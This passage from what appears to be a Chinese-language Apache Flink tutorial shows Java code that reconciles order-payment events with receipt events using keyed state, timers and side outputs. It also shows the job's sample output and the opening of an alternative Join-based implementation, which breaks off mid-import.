读取数据并转换成POJO类型</span></span><br><span class="line">    <span class="comment">// 读取订单支付事件数据</span></span><br><span class="line">    URL orderResource = TxPayMatch.class.getResource(<span class="string">&quot;/OrderLog.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;OrderEvent&gt; orderEventStream = env.readTextFile(orderResource.getPath())</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> OrderEvent(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), fields[<span class="number">1</span>], fields[<span class="number">2</span>], <span class="keyword">new</span> Long(fields[<span class="number">3</span>]));</span><br><span class="line">      &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;OrderEvent&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(OrderEvent element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ))</span><br><span class="line">      <span class="comment">// 交易id不为空，必须是pay事件</span></span><br><span class="line">      .filter(data -&gt; !<span class="string">&quot;&quot;</span>.equals(data.getTxId()));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取到账事件数据</span></span><br><span class="line">    URL receiptResource = TxPayMatch.class.getResource(<span class="string">&quot;/ReceiptLog.csv&quot;</span>);</span><br><span class="line">    SingleOutputStreamOperator&lt;ReceiptEvent&gt; receiptEventStream = env.readTextFile(receiptResource.getPath())</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ReceiptEvent(fields[<span class="number">0</span>], fields[<span class="number">1</span>], <span class="keyword">new</span> Long(fields[<span class="number">2</span>]));</span><br><span class="line">      &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;ReceiptEvent&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(ReceiptEvent element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将两条流进行连接合并，进行匹配处理，不匹配的事件输出到侧输出流</span></span><br><span class="line">    SingleOutputStreamOperator&lt;Tuple2&lt;OrderEvent, ReceiptEvent&gt;&gt; resultStream = orderEventStream.keyBy(OrderEvent::getTxId)</span><br><span class="line">      .connect(receiptEventStream.keyBy(ReceiptEvent::getTxId))</span><br><span class="line">      .process(<span class="keyword">new</span> TxPayMatchDetect());</span><br><span class="line"></span><br><span class="line">    resultStream.print(<span class="string">&quot;matched-pays&quot;</span>);</span><br><span class="line">    resultStream.getSideOutput(unmatchedPays).print(<span class="string">&quot;unmatched-pays&quot;</span>);</span><br><span class="line">    resultStream.getSideOutput(unmatchedReceipts).print(<span class="string">&quot;unmatched-receipts&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;tx match detect job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义CoProcessFunction</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TxPayMatchDetect</span> <span class="keyword">extends</span> <span class="title">CoProcessFunction</span>&lt;<span class="title">OrderEvent</span>, <span class="title">ReceiptEvent</span>, <span class="title">Tuple2</span>&lt;<span class="title">OrderEvent</span>, <span class="title">ReceiptEvent</span>&gt;&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// 定义状态，保存当前已经到来的订单支付事件和到账时间</span></span><br><span class="line">    ValueState&lt;OrderEvent&gt; payState;</span><br><span class="line">    ValueState&lt;ReceiptEvent&gt; receiptState;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      payState = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;OrderEvent&gt;(<span class="string">&quot;pay&quot;</span>, OrderEvent.class));</span><br><span class="line">      receiptState = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;ReceiptEvent&gt;(<span class="string">&quot;receipt&quot;</span>, ReceiptEvent.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement1</span><span class="params">(OrderEvent pay, Context ctx, Collector&lt;Tuple2&lt;OrderEvent, ReceiptEvent&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 订单支付事件来了，判断是否已经有对应的到账事件</span></span><br><span class="line">      ReceiptEvent receipt = receiptState.value();</span><br><span class="line">      <span class="keyword">if</span>( receipt != <span class="keyword">null</span> )&#123;</span><br><span class="line">        <span class="comment">// 如果receipt不为空，说明到账事件已经来过，输出匹配事件，清空状态</span></span><br><span class="line">        out.collect( <span class="keyword">new</span> Tuple2&lt;&gt;(pay, receipt) );</span><br><span class="line">        payState.clear();</span><br><span class="line">        receiptState.clear();</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果receipt没来，注册一个定时器，开始等待</span></span><br><span class="line">        ctx.timerService().registerEventTimeTimer( (pay.getTimestamp() + <span class="number">5</span>) * <span class="number">1000L</span> );    <span class="comment">// 等待5秒钟，具体要看数据</span></span><br><span class="line">        <span class="comment">// 更新状态</span></span><br><span class="line">        payState.update(pay);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement2</span><span class="params">(ReceiptEvent receipt, Context ctx, Collector&lt;Tuple2&lt;OrderEvent, ReceiptEvent&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 到账事件来了，判断是否已经有对应的支付事件</span></span><br><span class="line">      OrderEvent pay = payState.value();</span><br><span class="line">      <span class="keyword">if</span>( pay != <span class="keyword">null</span> )&#123;</span><br><span class="line">        <span class="comment">// 如果pay不为空，说明支付事件已经来过，输出匹配事件，清空状态</span></span><br><span class="line">        out.collect( <span class="keyword">new</span> Tuple2&lt;&gt;(pay, receipt) );</span><br><span class="line">        payState.clear();</span><br><span class="line">        receiptState.clear();</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果pay没来，注册一个定时器，开始等待</span></span><br><span class="line">        ctx.timerService().registerEventTimeTimer( (receipt.getTimestamp() + <span class="number">3</span>) * <span class="number">1000L</span> );    <span class="comment">// 等待3秒钟，具体要看数据</span></span><br><span class="line">        <span class="comment">// 更新状态</span></span><br><span class="line">        receiptState.update(receipt);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;Tuple2&lt;OrderEvent, ReceiptEvent&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 定时器触发，有可能是有一个事件没来，不匹配，也有可能是都来过了，已经输出并清空状态</span></span><br><span class="line">      <span class="comment">// 判断哪个不为空，那么另一个就没来</span></span><br><span class="line">      <span class="keyword">if</span>( payState.value() != <span class="keyword">null</span> )&#123;</span><br><span class="line">        ctx.output(unmatchedPays, payState.value());</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>( receiptState.value() != <span class="keyword">null</span> )&#123;</span><br><span class="line">        ctx.output(unmatchedReceipts, receiptState.value());</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 清空状态</span></span><br><span class="line">      payState.clear();</span><br><span class="line">      receiptState.clear();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 输出  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34729, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;sd76f87d6&#x27;</span>, timestamp=1558430844&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;sd76f87d6&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430847&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34730, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;3hu3k2432&#x27;</span>, timestamp=1558430845&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;3hu3k2432&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430848&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34732, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;32h3h4b4t&#x27;</span>, timestamp=1558430861&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;32h3h4b4t&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430852&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34733, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;766lk5nk4&#x27;</span>, timestamp=1558430864&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;766lk5nk4&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430855&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34734, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;435kjb45d&#x27;</span>, timestamp=1558430863&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;435kjb45d&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430859&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34735, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;5k432k4n&#x27;</span>, timestamp=1558430869&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;5k432k4n&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430862&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34736, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;435kjb45s&#x27;</span>, timestamp=1558430875&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;435kjb45s&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430866&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34738, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;43jhin3k4&#x27;</span>, timestamp=1558430896&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;43jhin3k4&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430871&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34741, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;88df0wn92&#x27;</span>, timestamp=1558430896&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;88df0wn92&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430882&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34737, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;324jnd45s&#x27;</span>, timestamp=1558430902&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;324jnd45s&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430868&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34743, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;3hefw8jf&#x27;</span>, timestamp=1558430900&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;3hefw8jf&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430885&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34744, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;499dfano2&#x27;</span>, timestamp=1558430903&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;499dfano2&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430886&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34742, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;435kjb4432&#x27;</span>, timestamp=1558430906&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;435kjb4432&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430884&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34745, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;8xz09ddsaf&#x27;</span>, timestamp=1558430896&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;8xz09ddsaf&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430889&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34739, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;98x0f8asd&#x27;</span>, timestamp=1558430907&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;98x0f8asd&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430874&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34746, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;3243hr9h9&#x27;</span>, timestamp=1558430895&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;3243hr9h9&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430892&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34740, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;392094j32&#x27;</span>, timestamp=1558430913&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;392094j32&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430877&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34747, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;329d09f9f&#x27;</span>, timestamp=1558430893&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;329d09f9f&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430893&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34749, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;324n0239&#x27;</span>, timestamp=1558430916&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;324n0239&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430899&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34748, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;809saf0ff&#x27;</span>, timestamp=1558430934&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;809saf0ff&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430895&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34752, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;rnp435rk&#x27;</span>, timestamp=1558430925&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;rnp435rk&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430905&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34751, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;24309dsf&#x27;</span>, timestamp=1558430941&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;24309dsf&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430902&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34753, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;8c6vs8dd&#x27;</span>, timestamp=1558430913&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;8c6vs8dd&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430906&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34750, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;sad90df3&#x27;</span>, timestamp=1558430941&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;sad90df3&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430901&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34755, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;8x0zvy8w3&#x27;</span>, timestamp=1558430918&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;8x0zvy8w3&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430911&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34754, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;3245nbo7&#x27;</span>, timestamp=1558430950&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;3245nbo7&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430908&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34758, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;32499fd9w&#x27;</span>, timestamp=1558430950&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;32499fd9w&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430921&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34759, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;9203kmfn&#x27;</span>, timestamp=1558430950&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;9203kmfn&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430922&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34760, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;390mf2398&#x27;</span>, timestamp=1558430960&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;390mf2398&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430926&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34757, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;d8938034&#x27;</span>, timestamp=1558430962&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;d8938034&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430915&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34761, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;902dsqw45&#x27;</span>, timestamp=1558430943&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;902dsqw45&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430927&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34762, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;84309dw31r&#x27;</span>, timestamp=1558430983&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;84309dw31r&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430933&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34763, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;sddf9809ew&#x27;</span>, timestamp=1558431068&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;sddf9809ew&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430936&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34764, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;832jksmd9&#x27;</span>, timestamp=1558431079&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;832jksmd9&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430938&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34765, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;m23sare32e&#x27;</span>, timestamp=1558431082&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;m23sare32e&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430940&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34766, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;92nr903msa&#x27;</span>, timestamp=1558431095&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;92nr903msa&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430944&#125;)</span></span><br><span class="line"><span class="meta">matched-pays&gt;</span><span class="bash"> (OrderEvent&#123;orderId=34767, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;sdafen9932&#x27;</span>, timestamp=1558432021&#125;,ReceiptEvent&#123;txId=<span class="string">&#x27;sdafen9932&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430949&#125;)</span></span><br><span class="line"><span class="meta">unmatched-receipts&gt;</span><span class="bash"> ReceiptEvent&#123;txId=<span class="string">&#x27;ewr342as4&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430845&#125;</span></span><br><span class="line"><span class="meta">unmatched-receipts&gt;</span><span class="bash"> ReceiptEvent&#123;txId=<span class="string">&#x27;8fdsfae83&#x27;</span>, payChannel=<span class="string">&#x27;alipay&#x27;</span>, timestamp=1558430850&#125;</span></span><br><span class="line"><span class="meta">unmatched-pays&gt;</span><span class="bash"> OrderEvent&#123;orderId=34731, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;35jue34we&#x27;</span>, timestamp=1558430849&#125;</span></span><br><span class="line"><span class="meta">unmatched-receipts&gt;</span><span class="bash"> ReceiptEvent&#123;txId=<span class="string">&#x27;9032n4fd2&#x27;</span>, payChannel=<span class="string">&#x27;wechat&#x27;</span>, timestamp=1558430913&#125;</span></span><br><span class="line"><span class="meta">unmatched-pays&gt;</span><span class="bash"> OrderEvent&#123;orderId=34768, eventType=<span class="string">&#x27;pay&#x27;</span>, txId=<span class="string">&#x27;88snrn932&#x27;</span>, timestamp=1558430950&#125;</span></span><br></pre></td></tr></table></figure></li></ul><h6 id="代码2-Join实现"><a href="#代码2-Join实现" class="headerlink" title="代码2-Join实现"></a>代码2-Join实现</h6><p><strong>这种方法的缺陷，只能获得正常匹配的结果，不能获得未匹配成功的记录。</strong></p><ul><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.OrderEvent;</span><br><span class="line"><span class="keyword">import</span> beans.ReceiptEvent;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.TimeCharacteristic;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.co.ProcessJoinFunction;</span><br><span class="line"><span class="keyword">import</span> 